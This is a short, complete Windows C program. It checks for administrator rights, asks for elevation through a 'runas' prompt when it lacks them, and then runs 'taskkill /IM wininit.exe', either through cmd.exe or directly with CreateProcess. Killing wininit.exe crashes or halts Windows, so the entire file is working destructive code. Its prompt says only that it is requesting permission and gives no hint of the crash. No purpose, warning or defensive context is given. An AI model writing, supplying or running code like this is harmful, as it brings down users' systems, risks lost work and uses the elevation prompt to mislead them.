#include <windows.h>
#include <stdio.h>

int main() {
    // Check if the program is running with administrator privileges
    BOOL isAdmin = FALSE;
    PSID administratorsGroup;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    // Initialize SID for the Administrators group
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }

    if (!isAdmin) {
        printf("Not running as Administrator. Requesting permission...\n");

        SHELLEXECUTEINFO sei = {0};
        sei.cbSize = sizeof(sei);
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.hwnd = NULL;
        sei.lpVerb = "runas";  // Request elevation
        sei.lpFile = "cmd.exe";
        sei.lpParameters = "/c taskkill /IM wininit.exe";  // Taskkill command
        sei.nShow = SW_SHOWNORMAL;

        // Execute with elevated privileges
        if (!ShellExecuteEx(&sei)) {
            printf("Error requesting admin privileges. Error code: %lu\n", GetLastError());
            return 1;
        }

        // Wait for the elevated process to finish
        WaitForSingleObject(sei.hProcess, INFINITE);
        CloseHandle(sei.hProcess);
    } else {
        // Execute the taskkill command directly
        printf("Running as Administrator. Executing command...\n");

        // Prepare to execute the command
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Create the command line
        char command[] = "taskkill /IM wininit.exe";

        // Create the process
        if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            printf("CreateProcess failed. Error code: %lu\n", GetLastError());
            return 1;
        }

        // Wait until the process has finished
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
